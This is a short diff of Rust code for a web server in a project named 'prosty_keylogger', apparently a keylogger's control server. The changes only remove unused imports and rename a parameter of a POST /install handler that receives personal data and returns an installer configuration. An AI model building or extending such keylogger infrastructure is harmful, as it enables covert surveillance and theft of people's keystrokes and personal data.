@@ -1,9 +1,9 @@
-use std::path::{Path, PathBuf};
+use std::path::{ PathBuf};
 use actix_web::{App, get, HttpResponse, HttpServer, post, Responder, web};
 use clap::Parser;
 use log::info;
 use rand::{Rng, thread_rng};
-use prosty_keylogger::common::{InstallConfiguration, PathFragment, PersonalData, ReportConfig, setup_logger, TaskConfiguration};
+use prosty_keylogger::common::{InstallConfiguration, PersonalData, ReportConfig, setup_logger, TaskConfiguration};
 use crate::options::Args;
 
 mod options;
@@ -35,7 +35,7 @@ async fn download_installer(data: web::Data<AppState>) -> actix_web::Result<acti
  */
 
 #[post("/install")]
-async fn installation(info: web::Json<PersonalData>, data: web::Data<AppState>)-> impl Responder{
+async fn installation(_info: web::Json<PersonalData>, data: web::Data<AppState>)-> impl Responder{
     info!("Received installation request");
     let install_config = &data.install_config;
     let config_json = serde_json::to_string(&install_config).unwrap();
